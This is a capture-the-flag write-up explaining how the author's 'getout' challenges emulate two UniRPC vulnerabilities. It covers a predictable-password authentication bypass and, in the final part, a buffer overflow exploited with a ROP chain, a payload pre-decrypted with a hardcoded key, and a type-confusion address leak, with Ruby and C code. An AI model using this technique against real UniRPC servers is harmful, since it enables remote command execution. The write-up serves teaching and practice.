## `getout`

`Getout` is a series of three different challenges, based on a
[research project](https://www.rapid7.com/blog/post/2023/03/29/multiple-vulnerabilities-in-rocket-software-unirpc-server-fixed/)
I did over the winter on Rocket Software's UniData application. UniData (and
other software they make) comes with a server called UniRPC, which functions
very similarly to `getoutrpc`.

My intention for the three parts of `getout` are:

* Solving `getout1-warmup` requires understanding how the RPC protocol works,
  which, as I said, is very similar to UniRPC
* In `getout2-gettoken`, I emulated [CVE-2023-28503](https://github.com/rbowes-r7/libneptune/blob/main/udadmin_authbypass_oscommand.rb) as best I could
* In `getout3-apply`, I emulated [CVE-2023-28502](https://github.com/rbowes-r7/libneptune/blob/main/udadmin_stackoverflow_password.rb) but made it much, much harder to exploit

Let's take a look at each!

### `getout1-warmup`

The warmup is largely about reverse engineering enough of the protocol to
implement it. You can find `libgetout.rb` in my solution, but the summary is
that:

* You connect to the RPC service
* You send messages to the server, which are basically just a header, then a
  body comprised of a series of packed fields (integers, strings, etc)
* The first message starts with an integer opcode:
  * Opcode 0 = "list services"
  * Opcode 1 = "execute a service"
* Once a service is executed, a different binary takes over, which implements
  its own sub-protocol (though the packet formats are the same)

For `getout1-warmup`, you just have to connect to the service and it immediately
sends you the flag. On the server, it looks like:

```c
int main(int argc, char *argv[])
{
  int s = atoi(argv[1]);

  packet_body_t *response = packet_body_create_empty();
  packet_body_add_int(response, 0);
  packet_body_add_file(response, FLAG_FILE, 1);
  packet_body_add_file(response, NARRATIVE_FILE, 0);
  packet_body_send(s, 2, response);
  packet_body_destroy(response);

  return 0;
}
```

And on the client, here's the code:

```ruby
begin
  s = connect(*get_host_port())
  flag, narrative = use(s, 'ping')

  puts "Fetched narrative: #{ narrative }"
  check_flag(flag, terminate: true)
  exit 0
ensure
  s.close if s
end
```

And running my solution:

```
$ ruby ./solve.rb 
Loading checker...
--------
Challenge name:        getout1-warmup
Expected flag:         CTF{your-client-seems-to-be-working} ("4354467b796f75722d636c69656e742d7365656d732d746f2d62652d776f726b696e677d")
Using TCP host/port:   getout1-warmup-e6a12797.challenges.bsidessf.net:1337
--------
Connected to RPC service! RPC services available:
* ping
* gettoken
* apply

Fetched narrative: Welcome to The Program, human! Your copy of Get Out Solutions seems to be working. Standby for further instructions!
Fetched flag: CTF{your-client-seems-to-be-working} ("4354467b796f75722d636c69656e742d7365656d732d746f2d62652d776f726b696e677d")
Looks good!
```

### `getout2-gettoken`

As I already mentioned, this is designed to emulate CVE-2023-28503, which is
an authentication bypass vulnerability in Rocket Software's UniData software.
In the original vulnerability, the username `:local:` had a predictable
password; specifically, the password for `:local:` was always
`<username>:<uid>:<gid>`, where `username` is a username on the system, `uid`
is the associated user id, and `gid` is a non-zero value.

I implemented a very similar function for `getout2-gettoken`, which looks like:

```c
  if(!strcmp(username, ":testuser:")) {
    // Test user

    char *uid = strchr(password, ':');
    if(!uid) {
      return 0;
    }

    *uid = '\0';
    uid++;

    char *gid = strchr(uid, ':');
    if(!gid) {
      return 0;
    }
    *gid = '\0';
    gid++;

    struct passwd *userinfo = getpwnam(password);
    if(!userinfo) {
      return 0;
    }

    if(userinfo->pw_uid != atoi(uid)) {
      return 0;
    }

    if(!atoi(gid)) {
      return 0;
    }


    return 1;
```

So basically, the username is `:testuser:`, but otherwise the bypassable login
is identical to CVE-2023-28503.

### `getout3-apply`

The final part of this challenge was designed to be similar to CVE-2023-28502,
but I decided to make it a bit harder.

The core issue is using `strncat` multiple times with the same buffer size, to
concatenate multiple arguments:

```c
  strncat(buffer + strlen(buffer), body->args[1].value.s.value, REGISTER_BUFFER_SIZE);
  strncat(buffer + strlen(buffer), body->args[2].value.s.value, REGISTER_BUFFER_SIZE);
  strncat(buffer + strlen(buffer), body->args[3].value.s.value, REGISTER_BUFFER_SIZE);
  strncat(buffer + strlen(buffer), body->args[4].value.s.value, REGISTER_BUFFER_SIZE);
  strncat(buffer + strlen(buffer), body->args[5].value.s.value, REGISTER_BUFFER_SIZE);
  strncat(buffer + strlen(buffer), uuid, REGISTER_BUFFER_SIZE);
```

The problem is that `strncat` terminates on a NUL byte, and we want to return
to an address to call `popen`! Luckily, immediately after calling the `strncat`
functions, the message is encrypted:

```c
  size_t length = encrypt((uint8_t*)buffer, strlen(buffer) + 1);
  send_simple_binary_response(s, 0, (uint8_t*)buffer, length);
```

The key/IV for the encryption algorithm are hardcoded into the binary, which
means we can predict the output of the encrypted block.

To write an exploit, we build a ROP stack containing all the NUL bytes we want:

```ruby
  puts "* Generating a ROP Chain..."
  ROP = [
    POP_EDI_RET,
    CMD_ADDRESS,
    POP_ESI_POP_R15_RET,
    R_ADDRESS,
    rand(0..0xffffffffffffffff),
    POPEN_ADDRESS,
    rand(0..0xffffffffffffffff),
  ].pack('QQQQQQQ')
  puts " => #{ ROP.unpack('H*') }"
  puts
```

Then we *decrypt* the payload, which means it'll *encrypt* to our ROP string:

```ruby
  puts "* Encrypting the ROP chain with padding..."
  encrypted_payload = get_encrypted_string(RETURN_OFFSET, rop)
  puts " => #{ encrypted_payload.unpack('H*') }"
```

The `get_encrypted_string` function is where we *decrypt* the payload:

```ruby
  def get_encrypted_string(offset, data)
    padding = 0x41.chr * offset

    cipher = OpenSSL::Cipher.new('AES-128-CBC')
    cipher.decrypt
    cipher.padding = 0
    cipher.key = KEY
    cipher.iv = IV

    str = padding + data
    while(str.length % 16 != 0)
      str.concat("\0")
    end

    return cipher.update(str) + cipher.final()
  end
```

If the *encrypted* string has a NUL byte, we try again until it doesn't.

The final thing is, we have access to `popen`, but we need a command string with
an associated address! We actually take advantage of a type-confusion bug in
the binary that leads to a memory leak in order to get known text at a known
address. 

When getting the user's opcode from a packet, instead of using a convenience
function like `packet_read_int_arg`, we instead access the union directly:

```c
  uint64_t opcode = body->args[0].value.i.value;
```

If that argument happens to be the string type, it winds up being the address
of the string:

```c
typedef struct {
  uint64_t value;
} arg_int_t;

typedef struct {
  char *value;
} arg_string_t;

// [...]

typedef union {
  arg_int_t i;
  arg_string_t s;
  // [...]
} arg_t;
```

Then when it's displayed, we get the string's address:

```c
  send_simple_response(s, ERROR_UNKNOWN_OPCODE, "Unknown opcode: %ld", opcode);
```

So basically, our exploit is:

* Use the type confusion on unknown opcodes to get an address to a payload string
* Generate a ROP stack that concludes with a call to `popen`
* *Decrypt* the ROP stack so that it'll later *encrypt* to the real ROP stack
* Send the whole ROP stack spread across multiple `strncat` fields
* Profit!
